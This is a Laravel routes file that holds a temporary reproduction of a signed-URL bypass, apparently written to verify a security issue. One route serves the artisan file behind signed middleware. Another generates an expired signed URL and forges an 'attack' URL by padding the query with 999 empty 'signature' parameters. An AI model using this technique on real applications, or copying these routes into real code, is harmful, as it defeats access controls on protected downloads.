<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\URL;

Route::get('/', function () {
    return view('welcome');
});

/*
|--------------------------------------------------------------------------
| Temporary signed URL bypass reproduction
|--------------------------------------------------------------------------
|
| Remove these routes after verifying the issue.
|
*/

Route::get('/_signed-repro', fn () => response()->download(base_path('artisan')))
    ->name('signed.repro')
    ->middleware('signed');

Route::get('/_signed-repro/make', function () {

    $expired = URL::temporarySignedRoute('signed.repro', now()->subMinute());

    $parts = parse_url($expired);
    parse_str($parts['query'], $query);

    $signature = $query['signature'];
    unset($query['signature']);

    $attack = $parts['scheme'].'://'.$parts['host']
        .(isset($parts['port']) ? ':'.$parts['port'] : '')
        .$parts['path']
        .'?'.str_repeat('signature&', 999)
        .'signature='.$signature
        .'&'.http_build_query($query);

    return response()->json([
        'expired' => $expired,
        'attack' => $attack,
    ]);
});
